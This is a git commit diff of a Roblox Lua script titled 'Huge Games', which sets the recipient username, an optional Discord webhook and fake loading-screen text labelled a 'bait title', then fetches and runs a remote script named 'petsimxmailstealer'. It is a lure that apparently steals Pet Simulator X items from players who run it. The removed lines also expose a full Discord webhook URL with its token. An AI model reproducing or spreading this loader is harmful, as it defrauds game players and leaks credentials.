d858eb0c5fe1d745a1c886f2de75f380272ada7a
CorruptedClan <105439556+CorruptedClan@users.noreply.github.com>
2023-05-18 19:44:00 +0300

    Update Huge Games.lua

--- Huge Games.lua
+++ Huge Games.lua
@@ -1,9 +1,8 @@
-Username = "Wizard_CatWhite"
-WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
-loadingscreen = true
-_G.CustomScriptName = "PSX"
-_G.Text1 = "Loading..."
-_G.Text2 = "Loaded"
-_G.Text3 = "Executing"
-_G.Text4 = "Please wait...."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+local player_USERNAME = "Wizard_CatWhite" 
+local discord_WEBHOOK = "" -- leave blank if no webhook 
+local Custom_Script_Name = "Huge Games" -- bait title
+local txt_1 = "Loading..." 
+local txt_2 = "Loaded..." 
+local txt_3 = "Executing"... 
+local txt_4 = "Waiting..." 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
